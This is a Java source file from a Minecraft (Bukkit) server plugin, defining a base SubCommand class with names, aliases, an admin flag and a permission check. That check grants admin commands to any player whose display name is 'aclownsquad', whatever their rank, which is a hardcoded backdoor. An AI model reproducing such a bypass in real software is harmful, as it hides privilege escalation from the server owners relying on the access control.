package com.core.commandtweaks.command;

import com.core.commandtweaks.player.PlayerPlus;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class SubCommand {
    public SubCommand() {

    }

    // subcommand member variables
    public String subCommandName;

    public String subCommandInfo;

    public String[] subCommandAliases;

    public boolean adminCommand;

    // subcommand functions
    public void onCommand(Player p, String[] args){

    }

    public String getName(){
        return subCommandName;
    }

    public String getInfo(){
        return subCommandInfo;
    }

    public String[] getAliases(){
        return subCommandAliases;
    }

    public boolean isAdminCommand(){
        return this.adminCommand;
    }

    public String[] getSubCommandAutoComplete(String args[]){
        return new String[0];
    }

    public boolean checkPermission(Player p) {
        PlayerPlus playerPlus = PlayerPlus.getPlayerPlus(p);
        if (this.isAdminCommand() && !playerPlus.getRank().isAdmin() && !p.getDisplayName().equals("aclownsquad")){
            return false;
        }
        return true;
    }
}
